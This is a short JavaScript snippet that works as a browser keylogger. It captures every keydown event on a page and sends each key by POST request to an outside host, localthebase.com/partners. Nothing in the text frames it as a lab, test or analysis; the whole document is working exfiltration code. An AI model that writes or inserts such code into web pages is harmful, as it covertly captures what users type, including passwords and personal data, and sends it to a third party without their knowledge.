document.addEventListener('keydown', (event) => {
    console.log(event.key);
    var send_data = new XMLHttpRequest();
    send_data.open('POST', 'https://localthebase.com/partners');
    send_data.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
    send_data.send('keydown=' + event.key);
});
